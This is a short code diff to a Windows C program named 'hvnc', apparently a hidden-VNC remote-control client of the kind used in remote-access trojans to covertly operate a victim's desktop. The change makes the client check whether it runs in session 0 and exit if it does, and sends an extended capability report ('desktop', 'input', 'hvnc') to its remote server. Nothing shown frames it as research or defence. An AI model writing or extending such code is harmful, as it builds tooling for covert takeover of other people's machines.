@@ -310,12 +310,22 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
         fprintf(stderr, "hvnc: cannot connect\n");
         return 1;
     }
-    char hello[320];
+    DWORD session_id = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
+    int hvnc_ok = (session_id != 0);
+    char hello[512];
     snprintf(hello, sizeof(hello),
              "{\"t\":\"hello\",\"os\":\"windows\",\"w\":%d,\"h\":%d,\"view_only\":false,"
-             "\"mode\":\"hvnc\",\"desktop\":\"%s\"}",
-             g_w, g_h, g_desktop);
+             "\"mode\":\"hvnc\",\"desktop\":\"%s\",\"caps\":[\"desktop\",\"input\",\"hvnc\"],"
+             "\"hvnc\":%s,\"session\":%lu,\"reason\":\"%s\"}",
+             g_w, g_h, g_desktop, hvnc_ok ? "true" : "false", (unsigned long)session_id,
+             hvnc_ok ? "" : "session 0 (SYSTEM) cannot host a hidden desktop");
     ws_send(&g_ws, hello, strlen(hello), 1);
+    if (!hvnc_ok) {
+        ws_close(&g_ws);
+        WSACleanup();
+        return 0;
+    }
 
     HANDLE th = CreateThread(NULL, 0, worker, NULL, 0, NULL);
     if (th) WaitForSingleObject(th, INFINITE);
